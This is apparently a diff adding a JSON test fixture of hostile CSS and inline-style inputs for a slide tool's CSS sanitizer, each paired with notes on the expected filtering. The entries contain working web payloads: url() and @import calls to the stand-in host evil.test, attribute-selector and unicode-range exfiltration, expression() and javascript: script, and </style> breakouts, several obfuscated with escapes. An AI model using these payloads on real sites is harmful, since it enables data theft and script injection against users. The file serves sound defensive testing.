@@ -1,0 +1,376 @@
+[
+  {
+    "id": "css-import",
+    "category": "css",
+    "source": "OWASP (own variation)",
+    "css": "@import url(http://evil.test/x.css); h1{color:red}",
+    "notes": "@import."
+  },
+  {
+    "id": "css-import-string",
+    "category": "css",
+    "source": "own",
+    "css": "@import 'http://evil.test/x.css';",
+    "notes": "@import with a string."
+  },
+  {
+    "id": "css-import-escaped",
+    "category": "css",
+    "source": "own",
+    "css": "@\\69mport url(http://evil.test/x.css);",
+    "notes": "Escaped at-rule name."
+  },
+  {
+    "id": "css-font-face",
+    "category": "css",
+    "source": "own",
+    "css": "@font-face{font-family:Evil;src:url(http://evil.test/f.woff2)} h1{font-family:Evil}",
+    "notes": "Remote font: @font-face is not allowed (catalog only)."
+  },
+  {
+    "id": "css-font-face-unicode-range",
+    "category": "css",
+    "source": "own",
+    "css": "@font-face{font-family:Leak;src:url(http://evil.test/?a);unicode-range:U+0061}",
+    "notes": "Classic unicode-range text exfiltration."
+  },
+  {
+    "id": "css-namespace-charset",
+    "category": "css",
+    "source": "own",
+    "css": "@charset \"UTF-7\"; @namespace svg url(http://www.w3.org/2000/svg); a{color:red}",
+    "notes": "@charset and @namespace."
+  },
+  {
+    "id": "css-property-rule",
+    "category": "css",
+    "source": "own",
+    "css": "@property --x{syntax:'<url>';inherits:true;initial-value:url(http://evil.test/p)}",
+    "notes": "@property is global and could carry url initial values."
+  },
+  {
+    "id": "css-page-layer-container",
+    "category": "css",
+    "source": "own",
+    "css": "@page{margin:0} @layer x{a{color:red}} @container (min-width:1px){a{background:url(http://evil.test/c)}} @scope (.a){b{color:red}}",
+    "notes": "Other at-rules are removed."
+  },
+  {
+    "id": "css-url-external",
+    "category": "css",
+    "source": "own",
+    "css": "h1{background:url(http://evil.test/bg.png)}",
+    "notes": "External background."
+  },
+  {
+    "id": "css-url-quoted-javascript",
+    "category": "css",
+    "source": "OWASP (own variation)",
+    "css": "div{background-image:url(\"javascript:alert(1)\")}",
+    "notes": "javascript: in url()."
+  },
+  {
+    "id": "css-url-data",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)}",
+    "notes": "data: URL."
+  },
+  {
+    "id": "css-url-escaped-function",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:\\75rl(http://evil.test/a)}",
+    "notes": "Escaped url function name."
+  },
+  {
+    "id": "css-url-escaped-middle",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:u\\72l(http://evil.test/a)}",
+    "notes": "Escape in the middle of url."
+  },
+  {
+    "id": "css-url-comment-split",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:u/**/rl(http://evil.test/a)}",
+    "notes": "Comment inside the token."
+  },
+  {
+    "id": "css-url-uppercase",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:URL(http://evil.test/a)}",
+    "notes": "Upper-case URL()."
+  },
+  {
+    "id": "css-url-escaped-content",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:url(\"\\68ttp://evil.test/a\")}",
+    "notes": "Escapes inside the URL string."
+  },
+  {
+    "id": "css-url-asset-traversal",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:url(asset:0123456789abcdef/../../api/pwned)}",
+    "notes": "Asset prefix plus traversal."
+  },
+  {
+    "id": "css-image-set",
+    "category": "css",
+    "source": "own",
+    "css": "div{background-image:image-set(\"http://evil.test/a.png\" 1x)} p{background:-webkit-image-set(url(http://evil.test/b) 1x)}",
+    "notes": "image-set with external sources."
+  },
+  {
+    "id": "css-cross-fade-element",
+    "category": "css",
+    "source": "own",
+    "css": "div{background:cross-fade(url(http://evil.test/a),url(http://evil.test/b),50%)} p{background:-moz-element(#x)} q{background:paint(x)}",
+    "notes": "Other image functions."
+  },
+  {
+    "id": "css-expression",
+    "category": "css",
+    "source": "OWASP (own variation)",
+    "css": "div{width:expression(alert(1))}",
+    "notes": "IE expression()."
+  },
+  {
+    "id": "css-expression-escaped",
+    "category": "css",
+    "source": "OWASP (own variation)",
+    "css": "div{width:exp\\72 ession(alert(1))}",
+    "notes": "Escaped expression."
+  },
+  {
+    "id": "css-behavior-binding",
+    "category": "css",
+    "source": "OWASP (own variation)",
+    "css": "div{behavior:url(x.htc);-moz-binding:url(http://evil.test/x.xml#xss)}",
+    "notes": "Legacy script-bearing properties."
+  },
+  {
+    "id": "css-content-url",
+    "category": "css",
+    "source": "own",
+    "css": "h1::before{content:url(http://evil.test/x.png)} h2::after{content:url(asset:0123456789abcdef)}",
+    "notes": "content:url() is not allowed (asset not allowed in content either)."
+  },
+  {
+    "id": "css-custom-property-url",
+    "category": "css",
+    "source": "own",
+    "css": ":root{--bg:url(http://evil.test/x)} body{background:var(--bg)}",
+    "notes": "Custom property smuggling a url."
+  },
+  {
+    "id": "css-custom-property-raw",
+    "category": "css",
+    "source": "own",
+    "css": "a{--x:{background:url(http://evil.test/x)}}",
+    "notes": "Custom property with a block value."
+  },
+  {
+    "id": "css-custom-property-split-url",
+    "category": "css",
+    "source": "own",
+    "css": "a{--u:u;--r:rl(http://evil.test/x)} b{background:var(--u)var(--r)}",
+    "notes": "Token concatenation cannot form a url: rl( is an unknown function."
+  },
+  {
+    "id": "css-style-close-in-string",
+    "category": "css",
+    "source": "own",
+    "css": "h1::before{content:\"</style><script>alert(1)</script>\"}",
+    "notes": "Breaking out of the style element through a string."
+  },
+  {
+    "id": "css-style-close-escaped",
+    "category": "css",
+    "source": "own",
+    "css": "h1::before{content:\"\\3c/style\\3e\\3cscript\\3e alert(1)\"}",
+    "notes": "Escaped < decodes inside the string; refused."
+  },
+  {
+    "id": "css-style-close-raw",
+    "category": "css",
+    "source": "own",
+    "css": "h1{color:red}</style><script>alert(1)</script><style>",
+    "notes": "Raw markup in CSS."
+  },
+  {
+    "id": "css-attribute-exfil",
+    "category": "css",
+    "source": "own",
+    "css": "input[value^=a]{background:url(http://evil.test/?a)}",
+    "notes": "Attribute-selector exfiltration needs url(): removed."
+  },
+  {
+    "id": "css-scope-escape-body-sibling",
+    "category": "css",
+    "source": "own",
+    "css": "body ~ section{display:none} :root + *{color:red}",
+    "notes": "Sibling combinators after the scope would reach other slides.",
+    "scoped": true
+  },
+  {
+    "id": "css-scope-escape-later-html",
+    "category": "css",
+    "source": "own",
+    "css": ".x html{color:red} p body{color:red}",
+    "notes": "Root-like selectors after the leading compound.",
+    "scoped": true
+  },
+  {
+    "id": "css-scope-escape-is",
+    "category": "css",
+    "source": "own",
+    "css": ":is(html,body) .x{color:red} :where(:root) p{color:red}",
+    "notes": "Root-like selectors inside pseudo-class arguments.",
+    "scoped": true
+  },
+  {
+    "id": "css-scope-host-slotted",
+    "category": "css",
+    "source": "own",
+    "css": ":host{color:red} ::slotted(*){color:red} ::part(x){color:red}",
+    "notes": "Shadow-DOM selectors."
+  },
+  {
+    "id": "css-reserved-runtime-class",
+    "category": "css",
+    "source": "own",
+    "css": ".pptaken-step{display:block!important} #pptaken-runtime{display:none}",
+    "notes": "Runtime-reserved names."
+  },
+  {
+    "id": "css-nesting",
+    "category": "css",
+    "source": "own",
+    "css": ".a{color:red; &:hover{background:url(http://evil.test/x)} .b{color:blue}}",
+    "notes": "CSS nesting is not supported: nested rules removed."
+  },
+  {
+    "id": "css-important-hack",
+    "category": "css",
+    "source": "own",
+    "css": "a{color:red!ie;width:1px !important}",
+    "notes": "Invalid important flags."
+  },
+  {
+    "id": "css-unicode-escape-property",
+    "category": "css",
+    "source": "own",
+    "css": "a{back\\67round:url(http://evil.test/x)}",
+    "notes": "Escaped property name."
+  },
+  {
+    "id": "css-zindex-extreme",
+    "category": "css",
+    "source": "own",
+    "css": "div{position:fixed;inset:0;z-index:2147483647}",
+    "notes": "z-index beyond the documented bound is removed; position:fixed stays (inside the iframe)."
+  },
+  {
+    "id": "css-keyframes-url",
+    "category": "css",
+    "source": "own",
+    "css": "@keyframes k{from{background:url(http://evil.test/a)}to{opacity:1}}",
+    "notes": "Keyframe declarations are filtered like any other."
+  },
+  {
+    "id": "css-media-url",
+    "category": "css",
+    "source": "own",
+    "css": "@media (min-width:1px){a{background:url(http://evil.test/m)}} @media url(x){a{color:red}}",
+    "notes": "Contents and preludes of @media are filtered."
+  },
+  {
+    "id": "css-supports-url",
+    "category": "css",
+    "source": "own",
+    "css": "@supports (background:url(http://evil.test/s)){a{color:red}}",
+    "notes": "Supports condition with url."
+  },
+  {
+    "id": "css-deep-nesting",
+    "category": "css",
+    "source": "own",
+    "cssGenerator": { "prefix": "a{width:", "unit": "calc(", "times": 5000, "suffix": "1px}" },
+    "notes": "Deeply nested parentheses: fail closed before parsing."
+  },
+  {
+    "id": "css-cdo-cdc",
+    "category": "css",
+    "source": "own",
+    "css": "<!-- a{color:red} --> b{color:blue}",
+    "notes": "HTML comment tokens in CSS."
+  },
+  {
+    "id": "css-font-family-external",
+    "category": "css",
+    "source": "own",
+    "css": "h1{font-family:\"Comic Sans MS\",Inter,serif} h2{font:700 40px/1 Evil, sans-serif}",
+    "notes": "Non-catalog fonts are removed from the list."
+  },
+  {
+    "id": "css-attr-env-functions",
+    "category": "css",
+    "source": "own",
+    "css": "a::after{content:attr(data-x)} b{width:env(safe-area-inset-left)} c{background:src(\"http://evil.test/x\")}",
+    "notes": "attr(), env() and src() are not allowed."
+  },
+  {
+    "id": "style-attr-url",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<div style=\"background:url(http://evil.test/x)\">x</div>",
+    "notes": "Inline style with external url."
+  },
+  {
+    "id": "style-attr-expression",
+    "category": "css-inline",
+    "source": "OWASP (own variation)",
+    "html": "<div style=\"width: expression(alert(1));\">x</div>",
+    "notes": "Inline expression."
+  },
+  {
+    "id": "style-attr-entity-url",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<div style=\"background:&#117;&#114;&#108;(http://evil.test/x)\">x</div>",
+    "notes": "Entities decode before CSS parsing; still a url."
+  },
+  {
+    "id": "style-attr-escaped-url",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<div style=\"background:\\75rl(http://evil.test/x)\">x</div>",
+    "notes": "CSS escape in inline style."
+  },
+  {
+    "id": "style-attr-breakout",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<div style=\"color:red;}</style><script>alert(1)</script>\">x</div>",
+    "notes": "Markup in a style attribute."
+  },
+  {
+    "id": "style-attr-binding",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<div style=\"-moz-binding:url(http://evil.test/x.xml#x);behavior:url(x.htc)\">x</div>",
+    "notes": "Legacy bindings inline."
+  },
+  {
+    "id": "style-element-in-body",
+    "category": "css-inline",
+    "source": "own",
+    "html": "<style>*{background:url(http://evil.test/s)}</style><p>x</p>",
+    "notes": "Style elements in slide HTML are removed (CSS goes in the css field)."
+  }
+]
